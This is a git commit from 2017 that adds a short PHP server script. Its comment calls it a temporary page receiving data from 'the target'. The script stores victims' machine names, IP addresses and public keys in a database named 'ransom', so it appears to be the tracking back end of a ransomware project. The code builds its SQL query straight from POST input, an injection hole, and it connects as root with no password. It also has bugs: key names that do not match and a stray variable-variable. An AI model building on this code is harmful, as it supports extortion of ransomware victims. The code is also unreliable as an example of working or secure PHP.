7501e6dad28ac8b92d1db541cd321e9fadf14809
Pierre <pierre.rispal@gmail.com>
2017-12-20 15:01:19 +0100

    Fichier de receptions de données temporaire

---
+++ server/post_temp.php
@@ -0,0 +1,13 @@
+<?php
+/* POST_TEMP.PHP 
+* page temporaire de réception des données de la cible
+* et enregistrement de ces données dans la base de données
+*/
+if(isset($_POST['machineName']) && isset($_POST['ipAddress']) && isset($_POST['publickey'])){
+	$machineName=$_POST['machineName'];
+	$ipAddress=$_POST['ipAddress'];
+	$publicKey=$_POST['publicKey'];
+
+	$con=mysqli_connect("localhost","root","","ransom");
+	$con->query("INSERT INTO `infos` (`id`, `machineName`, `ipAddress`, `publickey`) VALUES (NULL, '".$machineName."', '".$ipAddress."','".$$publickey."');");
+}
